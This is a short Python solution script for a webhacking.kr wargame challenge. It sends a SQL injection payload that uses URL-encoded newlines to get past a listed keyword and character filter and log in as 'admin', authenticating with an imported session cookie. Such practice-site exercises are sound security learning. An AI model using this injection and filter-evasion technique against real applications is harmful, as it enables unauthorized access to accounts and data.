import requests
from phpsessid import cookies

url = 'https://webhacking.kr/challenge/web-32/index.php?no='
payload = '1337%0aor%0aid=\'admin\'--%0a'

# select id from chall18 where id='guest' and no=$_GET[no]
#' ',/,(,),|,&,select,from,0x

response = requests.get(url+payload, cookies=cookies)
print(response.text)

